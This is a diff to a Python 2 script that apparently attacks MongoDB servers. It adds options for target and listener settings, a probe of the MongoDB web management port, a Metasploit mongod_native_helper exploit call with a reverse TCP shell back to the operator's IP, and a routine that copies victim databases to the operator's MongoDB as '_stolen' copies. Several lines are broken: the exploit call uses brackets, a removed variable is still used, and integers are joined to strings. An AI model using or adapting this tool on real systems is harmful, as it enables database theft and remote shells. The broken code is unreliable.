@@ -1,10 +1,13 @@
 #!/usr/bin/python
 
 import sys
+import string
+import random
 import os
-import socket
+import httplib2
+import urllib
 import pymongo
-import subprocess
+from subprocess import call
 
 
 
@@ -25,7 +28,7 @@ def mainMenu():
 			options()
 
 		elif select == "2":
-			netAttacks(host)
+			netAttacks(victim)
 		
 		elif select == "3":
 			webApps()
@@ -39,35 +42,42 @@ def mainMenu():
 			
 
 def options():
-	global host
+	global victim
+	global webPort
 	global uri
 	global httpMethod
 	global myIP
-
 	select = True
+	
 	while select:	
 		print "\n\n"
 		print "Options"
 		print "1-Set target host/IP"
-		print "2-Set URI Path"
-		print "3-Set HTTP Request Method (GET/POST)"
-		print "4-Set my local Mongo IP"
-		print "5-Set shell listener port (Not implemented)"
-		print "6-Back to main menu"
+		print "2-Set web app port"
+		print "3-Set URI Path"
+		print "4-Set HTTP Request Method (GET/POST)"
+		print "5-Set my local Mongo/Shell IP"
+		print "6-Set shell listener port"
+		print "7-Back to main menu"
 
 		select = raw_input("Select an option:")
 		
 		if select == "1":
-			host = raw_input("Enter the host IP/DNS name: ")
-			print "Target set to " + host + "\n"
+			victim = raw_input("Enter the host IP/DNS name: ")
+			print "Target set to " + victim + "\n"
 			options()
-
+			
 		elif select == "2":
-			uri = raw_input("Enter URI Path:")
-			print "URI Path set to " + uri + "\n"
+			webPort = raw_input("Enter the HTTP port for web apps:")
+			print "HTTP port set to " + webPort + "\n"
 			options()
 
 		elif select == "3":
+			uri = raw_input("Enter URI Path (Press enter for no URI:")
+			print "URI Path set to " + uri + "\n"
+			options()
+
+		elif select == "4":
 			httpMethod = True
 			while httpMethod:
 
@@ -85,17 +95,17 @@ def options():
 				else:
 					print "Invalid selection"
 
-		elif select == "4":
-			myIP = raw_input("Enter host IP for my Mongo: ")
+		elif select == "5":
+			myIP = raw_input("Enter host IP for my Mongo/Shells: ")
 			print "Shell IP set to " + myIP + "\n"
 			options()
 		
-		elif select == "5":
+		elif select == "6":
 			myPort = raw_input("Enter TCP listener for shells: ")
 			print "Shell TCP listener set to " + myPort + "\n"
 			options()
 			
-		elif select == "6":
+		elif select == "7":
 			mainMenu()
 
 def netAttacks(target):
@@ -110,6 +120,19 @@ def netAttacks(target):
 	
 	except:
 		print "MongoDB port closed."
+		
+		
+	mgtUrl = "http://" + target + ":28017"
+	mgtRespCode = urllib.urlopen(mgtUrl).getcode()
+	
+	try:	
+		if mgtRespCode == 200:
+			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
+	
+		else:
+			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
+	except:
+		print "MongoDB web management closed."
 	
 	if mgtOpen == True:
 
@@ -127,10 +150,55 @@ def netAttacks(target):
 		
 		if stealDB == "y" or stealDB == "Y":
 			stealDBs (myIP)
+			
+		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
+		
+		if getShell == "y" or getShell == "Y":
+			try:
+				call["msfcli","exploit/linux/misc/mongod_native_helper","RHOST=" + victim,"DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=" + myIP, "LPORT="+ myPort, "E" ]
+			
+			except:
+				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
 	
 	raw_input("Press enter to continue...")
+	return()
 		
+	
+	
+def webApps():
+	print "Checking to see if web server at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
+	
+	appURL = "http://" + str(victim) + ":" + str(webPort) #+ str(uri)
+	appRespCode = urllib.urlopen(appURL).getcode()
+	
+	try:
+		if appRespCode == 200:
+			print "App is up, starting injection test."
+			appUp = True
 		
+		else:
+			print "Got " + appRespCode + "from the app, check your options."
+	except:
+		print "Looks like the server didn't respond.  Check your options."
+	
+	if appUp == True:
+			
+		injectSize = raw_input("Baseline test-Enter random string size: ")
+		injectString = randInjString(int(injectSize))
+		
+		print "Injecting " + injectString + " for baseline response size..."
+	
+	raw_input("Press enter to continue...")
+	return()
+
+def randInjString(size):
+	chars = string.ascii_letters + string.digits
+	return ''.join(random.choice(chars) for x in range(size))
+	
+	
+	
+	
+
 def stealDBs(myDB):
 	menuItem = 1	
 	
@@ -144,10 +212,7 @@ def stealDBs(myDB):
 	except:
 		print "Invalid selection."
 		stealDBs(myDB)
-	
-	
 		
-
 	try:
 		myDBConn = pymongo.MongoClient(myDB,27017)
 		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",host)	
@@ -157,7 +222,7 @@ def stealDBs(myDB):
 			stealDBs(myDB)
 		
 		else:
-			mainMenu()
+			return()
 	
 	except:
 		print "Something went wrong.  Are you sure your MongoDB is running?"
